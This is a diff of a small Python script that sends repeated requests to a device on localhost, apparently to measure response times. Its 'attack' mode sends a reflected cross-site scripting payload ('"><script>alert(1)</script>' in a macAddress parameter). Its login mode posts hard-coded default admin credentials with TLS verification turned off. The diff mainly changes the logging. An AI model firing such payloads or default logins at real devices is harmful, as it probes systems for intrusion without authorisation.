@@ -4,47 +4,54 @@ import argparse
 import ssl
 import requests
 import warnings
+import datetime
 warnings.filterwarnings("ignore", message="Unverified HTTPS request is being made to host 'localhost'")
 
-# Write a time to a file
-def log(file_name, time)
+# Log how long a request and when
+def log(file_name, time):
   f = open(file_name, "a")
-  f.write(time + "\n")
+  f.write(str(datetime.datetime.now().strftime("%H:%M:%S")) + ', ' + "\n")
   f.close()
 
 # Login to the device
-def login(url):
+def login(url, log):
   url = url + '/login.php'
   headers = {'username' : 'admin',
     'password' : 'password',
     'id' : '123456' }
 
+  log.write(str(datetime.datetime.now().strftime("%H:%M:%S")) + ', ')
   r = requests.post(url, headers=headers, verify=False)
   print('Response from the server: ' + str(r.status_code))
   print('Response time: ' + str(r.elapsed))
-  log("login.txt", r.elapsed)
+  log.write(str(r.elapsed) + "\n")
 
 # Send the attack
-def attack(url):
+def attack(url, log):
   payload = '?/boardData103?macAddress="><script>alert(1)</script>'
 
+  log.write(str(datetime.datetime.now().strftime("%H:%M:%S")) + ', ')
   r = requests.get(url + payload, verify=False)
   print('Response from the server: ' + str(r.status_code))
   print('Response time: ' + str(r.elapsed))
-  log("attack.txt", r.elapsed)
-    
-# Parse url, read args and execute the script
+  log.write(str(r.elapsed) + "\n")
+
+# Parse url, read args, log and send the packets
 def main():
   if args.https:
     url = 'https://localhost:' + str(args.port)
   else:
     url = 'http://localhost:' + str(args.port)
 
+  log = open(args.mode + ".txt", "a")
+
   for x in range(args.repeats):
     if args.mode == 'xss':
-      attack(url)
+      attack(url, log)
     else:
-      login(url)
+      login(url, log)
+
+  log.close()
 
 # Define the command line parser     
 if __name__ == "__main__":
